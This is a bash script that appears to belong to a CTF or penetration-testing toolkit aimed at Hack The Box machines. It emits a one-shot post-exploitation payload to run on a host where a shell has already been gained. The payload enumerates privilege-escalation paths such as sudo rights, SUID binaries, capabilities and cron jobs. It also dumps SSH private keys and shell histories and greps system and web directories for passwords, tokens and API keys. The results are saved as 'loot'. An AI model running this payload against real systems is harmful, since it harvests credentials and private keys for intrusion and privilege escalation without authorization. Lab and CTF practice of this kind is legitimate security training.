#!/usr/bin/env bash
# postfoothold.sh — The reflex you run the SECOND you land a shell.
#
# Emits ONE dependency-free enumeration payload (no downloads — boxes are
# often air-gapped) that you push to the target and run in a SINGLE command,
# capturing everything to reports/<target>/loot/postfoothold-<ts>.txt.
#
# WHY THIS EXISTS: on cohort.htb we got a shell and then never ran systematic
# local enum — burned ~2h and real money chasing a kernel exploit on an EASY
# box. 90% of easy/medium roots fall out of this one sweep: sudo, SUID, cron,
# caps, readable creds, service-as-root, password reuse. Do this FIRST.
#
# The section headers (SUDO / SUID / CAPABILITIES / CRON / TIMER / CREDS /
# SSH / ENV / PASSWORD / ROOT PROCESSES / LISTENING / WRITABLE) are the exact
# tokens the auto-seeded privesc hypotheses grep for — keep them in sync.
#
# Usage:
#   bash scripts/postfoothold.sh --emit        # print payload; pipe to target
#   bash scripts/postfoothold.sh --run '<cmd>' # run payload via a command that
#                                              # reads the script on STDIN, and
#                                              # save output to loot/
#   bash scripts/postfoothold.sh --local       # run against THIS host (testing)
#
# Transport examples for --run (the runner must read the script on stdin):
#   --run 'ssh user@target sh'
#   --run 'sshpass -p PW ssh user@target sh'
#   For one-shot exec primitives (marimo WS, web shell), pass the whole payload
#   as one argument instead — see the printed hint after --emit.

set -uo pipefail
WS="$(cd "$(dirname "$0")/.." && pwd)"
STATE="$WS/state/orchestrator.json"

slug_from_state() {
  [[ -f "$STATE" ]] || return 1
  local t; t=$(python3 -c "import json;print(json.load(open('$STATE'))['target'])" 2>/dev/null) || return 1
  echo "$t" | tr '/' '-' | tr -cd 'a-zA-Z0-9._-'
}

# ── The payload. Pure POSIX-ish shell, read-only, bounded, quiet. ──────────
read -r -d '' PAYLOAD <<'EOF'
sh -c '
T() { command -v timeout >/dev/null 2>&1 && timeout "$1" sh -c "$2" 2>/dev/null || sh -c "$2" 2>/dev/null; }
echo "===== WHOAMI / ID ====="; id; whoami 2>/dev/null; hostname 2>/dev/null
echo "===== KERNEL / OS ====="; uname -a; cat /etc/os-release 2>/dev/null | head -4
echo "===== SUDO ====="; sudo -n -l 2>/dev/null || echo "(no passwordless sudo / not allowed)"
echo "===== SUID ====="; T 20 "find / -perm -4000 -type f -not -path \"/proc/*\" 2>/dev/null | head -60"
echo "===== SGID ====="; T 15 "find / -perm -2000 -type f -not -path \"/proc/*\" 2>/dev/null | head -40"
echo "===== CAPABILITIES ====="; command -v getcap >/dev/null 2>&1 && T 15 "getcap -r / 2>/dev/null | head -40" || echo "(getcap unavailable)"
echo "===== CRON ====="; cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null; crontab -l 2>/dev/null; ls -la /var/spool/cron/crontabs 2>/dev/null
echo "===== TIMER ====="; systemctl list-timers --all --no-pager 2>/dev/null | head -20
echo "===== ROOT PROCESSES ====="; ps -eo user,pid,cmd 2>/dev/null | grep -E "^root" | grep -vE "\[" | head -40
echo "===== LISTENING ====="; (ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null) | head -40
echo "===== ENV ====="; env 2>/dev/null | grep -ivE "^LS_COLORS" | head -40
echo "===== SSH ====="; ls -la ~/.ssh 2>/dev/null; cat ~/.ssh/id_* 2>/dev/null | head -30; cat ~/.ssh/authorized_keys 2>/dev/null | head
echo "===== CREDS / PASSWORD ====="
cat /etc/passwd 2>/dev/null | grep -vE "nologin|false$" | head -30
T 20 "grep -rIl -e password -e passwd -e secret -e api_key -e token /etc /opt /srv /var/www /home 2>/dev/null | grep -vE \"/proc/|/sys/\" | head -30"
cat ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null | tail -40
echo "===== CONFIG FILES (.env / *.conf near web/app) ====="; T 15 "find /opt /srv /var/www /home /app -maxdepth 4 -type f \( -name \"*.env\" -o -name \"*.conf\" -o -name \"*.yml\" -o -name \"*.yaml\" -o -name \"config*.json\" \) 2>/dev/null | head -40"
echo "===== WRITABLE (root-owned files writable by us, world-writable dirs) ====="
T 20 "find / -type f -perm -0002 -not -path \"/proc/*\" -not -path \"/sys/*\" 2>/dev/null | head -30"
T 15 "find /etc /opt /srv /usr/local -writable -not -path \"/proc/*\" 2>/dev/null | head -30"
echo "===== INTERESTING HOMES / OPT / RECENT ====="; ls -la /home /opt /srv /root 2>/dev/null; T 10 "find /home /opt /srv -maxdepth 3 -mmin -240 -type f 2>/dev/null | head -20"
echo "===== CONTAINER? ====="; ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -3
echo "===== DONE ====="
'
EOF

MODE="${1:---emit}"

emit_hint() {
  echo "" >&2
  echo "──────────────────────────────────────────────────────────────" >&2
  echo "▶ Run this on the target in ONE shot (do NOT run commands one by" >&2
  echo "  one — that is what made cohort.htb cost 193 requests). Capture:" >&2
  echo "    ... | tee reports/${1:-<target>}/loot/postfoothold-\$(date +%H%M%S).txt" >&2
  echo "  For a one-shot exec primitive (web shell / WS), pass the whole" >&2
  echo "  payload as a single argument to your runner." >&2
  echo "──────────────────────────────────────────────────────────────" >&2
}

case "$MODE" in
  --emit|"")
    printf '%s\n' "$PAYLOAD"
    emit_hint "$(slug_from_state 2>/dev/null)"
    ;;
  --local)
    slug="$(slug_from_state)" || { echo "No active engagement."; exit 1; }
    out="$WS/reports/$slug/loot/postfoothold-local-$(date +%H%M%S).txt"
    mkdir -p "$(dirname "$out")"
    printf '%s\n' "$PAYLOAD" | sh 2>&1 | tee "$out"
    echo "[+] saved: reports/$slug/loot/$(basename "$out")"
    ;;
  --run)
    RUNNER="${2:-}"
    [[ -n "$RUNNER" ]] || { echo "Usage: postfoothold.sh --run '<cmd reading script on stdin>'"; exit 2; }
    slug="$(slug_from_state)" || { echo "No active engagement."; exit 1; }
    out="$WS/reports/$slug/loot/postfoothold-$(date +%H%M%S).txt"
    mkdir -p "$(dirname "$out")"
    printf '%s\n' "$PAYLOAD" | bash -c "$RUNNER" 2>&1 | tee "$out"
    echo "[+] saved: reports/$slug/loot/$(basename "$out")"
    ;;
  -h|--help)
    sed -n '2,30p' "$0"
    ;;
  *)
    echo "Unknown mode: $MODE (use --emit | --run '<cmd>' | --local)"; exit 2;;
esac
